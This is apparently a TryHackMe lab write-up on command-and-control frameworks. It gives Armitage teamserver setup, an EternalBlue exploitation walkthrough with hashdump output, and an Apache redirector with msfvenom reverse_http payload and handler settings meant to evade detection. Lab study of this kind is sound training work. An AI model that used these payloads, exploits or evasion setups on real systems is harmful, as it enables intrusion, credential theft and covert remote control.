# THM-Writeup-C2

Comprehensive walkthrough covering C2 infrastructure setup, payload generation, listener configuration, exploitation, and OPSEC techniques using Metasploit and Armitage.

By **Ramyar Daneshgar**

---

## Task 1: Introduction

I did this lab to deepen my understanding of Command and Control (C2) frameworks. These frameworks are used to manage compromised hosts, maintain persistent access, and coordinate post-exploitation activities during red team operations and adversary emulation engagements. The room introduces concepts ranging from basic architecture to advanced OPSEC practices.

---

## Task 2: Command and Control Framework Structure

I studied the architectural components critical to any C2 framework:

1. **C2 Server**: Acts as the central control point, managing inbound connections and issuing commands.
2. **Agents (Payloads)**: Executable stubs deployed on targets that initiate outbound connections to the C2 server.
3. **Listeners**: Network services on the C2 server awaiting beacon traffic from agents.
4. **Beacons**: Periodic HTTP/DNS/SMB/TCP callbacks from agents for command retrieval.
5. **Obfuscation Techniques**: Introduced to avoid detection by traffic analysis tools and anomaly-based systems.

### Example: Sleep Timers and Jitter

To defeat signature-based network detection mechanisms, I implemented jitter around beacon intervals:

```python
import random
sleep = 60
jitter = random.randint(-30, 30)
sleep = sleep + jitter
```

This randomized interval prevents the detection of predictable callback patterns.

---

## Task 3: Common C2 Frameworks

I analyzed both free and commercial C2 frameworks:

- **Metasploit Framework**: An exploitation and post-exploitation platform with integrated payload generation (via `msfvenom`) and extensive module support.
- **Armitage**: Java-based GUI frontend for Metasploit, offering multi-user collaboration and visual session management.
- **PowerShell Empire / Starkiller**: Modular, post-exploitation C2 leveraging PowerShell for agent deployment.
- **Covenant**: A .NET-based, cross-platform C2 with HTTP/SMB listeners and C#-compiled agents.
- **Sliver**: A Go-based, multi-user, CLI-driven C2 supporting multiple transport protocols including mTLS, DNS, and WireGuard.

Commercial frameworks like **Cobalt Strike** and **Brute Ratel** offer advanced malleability, in-memory execution, evasive payloads, and robust pivoting capabilities, which are critical for high-fidelity red team operations.

---

## Task 4: Setting Up a C2 Framework

I chose Armitage due to its tight integration with Metasploit and support for shared session operations.

### Step 1: Cloning and Building Armitage

```bash
git clone https://gitlab.com/kalilinux/packages/armitage.git
cd armitage
bash package.sh
```

### Step 2: Initializing the Metasploit Database

```bash
systemctl start postgresql
msfdb --use-defaults init
```

### Step 3: Starting the Teamserver

```bash
cd release/unix
./teamserver <public_IP> <shared_password>
```

This enables remote team members to connect to the same C2 instance.

### Step 4: Launching the Armitage GUI

```bash
./armitage
```

---

## Task 5: C2 Operation Basics

I followed standard OPSEC practices to avoid exposing the Armitage management interface to public networks. I forwarded the necessary port using SSH tunneling:

```bash
ssh -L 55553:127.0.0.1:55553 user@<remote_c2_server>
```

Within Armitage, I configured a Meterpreter reverse listener on TCP/31337.

---

## Task 6: Command, Control, and Conquer

### Reconnaissance

From Armitage’s GUI:

```
Hosts → Nmap Scan → Quick Scan
```

I discovered a vulnerable Windows 7 system with SMBv1 exposed.

### Exploitation

I deployed the MS17-010 (EternalBlue) exploit:

```
Attacks → Exploits → Windows → SMB → ms17_010_eternalblue
```

The exploit returned a Meterpreter session.

### Post-Exploitation

```bash
getuid
hashdump
```

Recovered hashes:

- Administrator: `c156d5d108721c5626a6a054d6e0943c`
- Ted: `2e2618f266da8867e5664425c1309a5c`

### Flag Collection

```bash
cat C:/Users/Administrator/Desktop/root.txt
cat C:/Users/Ted/Desktop/user.txt
```

- Root Flag: `THM{bd6ea6c871dced619876321081132744}`
- User Flag: `THM{217fa45e35f8353ffd04cfc0be28e760}`

---

## Task 7: Advanced C2 Setups

To obfuscate direct communication with my Metasploit handler, I deployed a redirector using Apache2.

### Apache2 Redirector Setup

```bash
apt install apache2
a2enmod rewrite proxy proxy_http headers
```

Edited `/etc/apache2/sites-available/000-default.conf`:

```apache
<VirtualHost *:80>
  RewriteEngine On
  RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
  ProxyPass / http://127.0.0.1:8080/
</VirtualHost>
```

### Payload Generation with Custom Header

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=127.0.0.1 LPORT=8080 \
HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

### Metasploit Listener Configuration

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
set HttpUserAgent NotMeterpreter
set OverrideLHOST <redirector_IP>
set OverrideLPORT 80
set OverrideRequestHost true
run
```

This configuration ensured that all C2 traffic passed through the redirector and was filtered based on custom headers.

---

## Task 8: Lessons Learned

Through this lab, I developed a strong technical foundation in:

- C2 infrastructure design and deployment
- Payload engineering (staged vs. stageless)
- Evasion strategies including beacon obfuscation and redirectors
- Safe listener exposure through SSH tunneling
- Redirector deployment using Apache2 and mod_rewrite
- Real-world exploitation via EternalBlue
- Post-exploitation data collection and lateral movement foundations


This lab provided a full lifecycle walkthrough of deploying and operating a command and control infrastructure with an emphasis on OPSEC and post-exploitation. By operationalizing redirectors, custom headers, and Metasploit integrations, I now have working knowledge applicable to red teaming, adversary emulation, and purple team development.

Next steps: implement DNS-based C2, experiment with Sliver’s mTLS payloads, and extend redirectors using NGINX with JA3 fingerprint evasion.

